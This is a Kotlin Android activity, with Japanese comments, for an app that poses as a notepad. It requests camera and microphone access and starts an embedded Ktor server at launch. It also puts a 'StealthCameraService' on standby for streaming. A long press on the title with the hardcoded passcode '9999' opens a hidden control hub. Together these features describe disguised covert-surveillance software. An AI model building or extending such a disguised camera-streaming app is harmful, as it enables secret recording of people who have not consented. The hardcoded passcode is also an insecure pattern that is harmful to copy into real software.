package com.stealth.evidence.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.stealth.evidence.R

class MainActivity : AppCompatActivity() {

    private val PERMISSIONS_REQUEST_CODE = 100
    // シークレットモード（コントロールハブ）に入るための隠しパスワード
    private val SECRET_PASSWORD = "9999"

    private lateinit var embeddedServer: EmbeddedServer

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        checkPermissions()

        // アプリ起動と同時にKtorサーバーを立ち上げる
        embeddedServer = EmbeddedServer(applicationContext)
        embeddedServer.start()

        // 同時に、カメラをストリーミング配信用にスタンバイさせる
        startCameraStandby()

        // ★修正：偽装用：画面上部の「メモ帳」タイトルを長押しした時の隠しギミック
        findViewById<android.view.View>(R.id.headerTitle).setOnLongClickListener {
            showPasswordDialog()
            true
        }
    }

    private fun startCameraStandby() {
        val intent = Intent(this, StealthCameraService::class.java).apply {
            action = StealthCameraService.ACTION_START_STANDBY
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun checkPermissions() {
        val requiredPermissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requiredPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                PERMISSIONS_REQUEST_CODE
            )
        }
    }

    private fun showPasswordDialog() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
        }

        AlertDialog.Builder(this)
            .setTitle("パスコード入力")
            .setView(input)
            .setPositiveButton("OK") { _, _ ->
                val password = input.text.toString()
                if (password == SECRET_PASSWORD) {
                    // パスワードが合致したら、コントロールハブへ遷移
                    startActivity(Intent(this, SecretMenuActivity::class.java))
                } else {
                    Toast.makeText(this, "認証失敗", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("キャンセル", null)
            .show()
    }

    override fun onDestroy() {
        super.onDestroy()
        // アプリ終了時にサーバーも停止させる
        embeddedServer.stop()
    }
}
